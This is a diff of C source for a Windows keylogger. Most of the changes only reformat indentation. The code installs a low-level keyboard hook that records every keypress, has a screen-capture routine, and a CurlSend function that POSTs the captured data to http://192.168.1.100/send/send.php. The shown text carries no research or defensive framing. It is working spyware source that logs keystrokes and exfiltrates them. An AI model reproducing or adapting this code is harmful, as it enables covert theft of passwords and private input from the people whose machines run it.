@@ -8,7 +8,6 @@ unsigned int bufferIndex = 0;
 unsigned int bufferSize = BUFFERLEN;
 HANDLE mutex;
 
-
 void ScreenCapture(int width, int height)
 {
 	HDC hDc = CreateCompatibleDC(0);
@@ -33,44 +32,39 @@ int FileSend(char *data, int length)
 
 int CurlSend(char *data, int length)
 {
-  CURL *curl;
-  CURLcode res;
-  
-  curl_global_init(CURL_GLOBAL_ALL);
-  curl = curl_easy_init();
-  res = CURLE_OK;
-  
-  if(curl)
-  {
-  	char *inputStr = "input=";
-  	char *httpStr = curl_easy_escape(curl, data, length);
-  	
-  	char *sendStr = (char *)malloc(strlen(inputStr) + strlen(httpStr) + 1);
-  	strcpy(sendStr, inputStr);
-  	strcat(sendStr, httpStr);
-  	
-    curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.1.100/send/send.php");
-    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, sendStr);
-    res = curl_easy_perform(curl);
-    curl_easy_cleanup(curl);
-    
-    curl_free(httpStr);
-    free(sendStr);
-  }
-  curl_global_cleanup();
-  
-  if(res == CURLE_OK)
-  {
-  	return 1;
-  }
-  
-  return 0;	
-}
-
-
-
-DWORD WINAPI ThreadFunc(void *data)
-{
+	CURL *curl;
+	CURLcode res;
+	
+	curl_global_init(CURL_GLOBAL_ALL);
+	curl = curl_easy_init();
+	res = CURLE_OK;
+	
+	if(curl)
+	{
+		char *inputStr = "input=";
+		char *httpStr = curl_easy_escape(curl, data, length);
+		
+		char *sendStr = (char *)malloc(strlen(inputStr) + strlen(httpStr) + 1);
+		strcpy(sendStr, inputStr);
+		strcat(sendStr, httpStr);
+		
+		curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.1.100/send/send.php");
+		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, sendStr);
+		res = curl_easy_perform(curl);
+		curl_easy_cleanup(curl);
+		
+		curl_free(httpStr);
+		free(sendStr);
+	}
+	
+	curl_global_cleanup();
+	
+	if(res == CURLE_OK)
+	{
+		return 1;
+	}
+	
+	return 0;	
 }
 
 void ConvertKey(unsigned int key, char *outStr)
@@ -118,30 +112,30 @@ void SaveKey(unsigned int key)
 
 LRESULT CALLBACK RawInput(int nCode, WPARAM wParam, LPARAM lParam)
 {
-    KBDLLHOOKSTRUCT *keyboard = (KBDLLHOOKSTRUCT *)lParam;
-    
-    if (wParam == WM_KEYDOWN)
-    {
-    	SaveKey(keyboard->vkCode);
-    }
-    
-    return 0;
+	KBDLLHOOKSTRUCT *keyboard = (KBDLLHOOKSTRUCT *)lParam;
+	
+	if (wParam == WM_KEYDOWN)
+	{
+		SaveKey(keyboard->vkCode);
+	}
+	
+	return 0;
 }
 
 DWORD WINAPI KeyLogger()
 {
-    HHOOK hKeyHook;
-    HINSTANCE hExe = GetModuleHandle(NULL);
-    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)RawInput, hExe, 0);
-    MSG msg;
-
-    while (GetMessage(&msg, NULL, 0, 0) != 0)
-    {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
-    
-    return 0;
+	HHOOK hKeyHook;
+	HINSTANCE hExe = GetModuleHandle(NULL);
+	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)RawInput, hExe, 0);
+	MSG msg;
+	
+	while (GetMessage(&msg, NULL, 0, 0) != 0)
+	{
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+	}
+	
+	return 0;
 }
 
 
@@ -153,8 +147,8 @@ int main(void)
 	buffer[0] = 0;
 	
 	HANDLE logger;
-    logger = CreateThread(NULL, 0, KeyLogger, NULL, 0, NULL);
-
+	logger = CreateThread(NULL, 0, KeyLogger, NULL, 0, NULL);
+	
 	int timer = 0;
 	int len;
 	
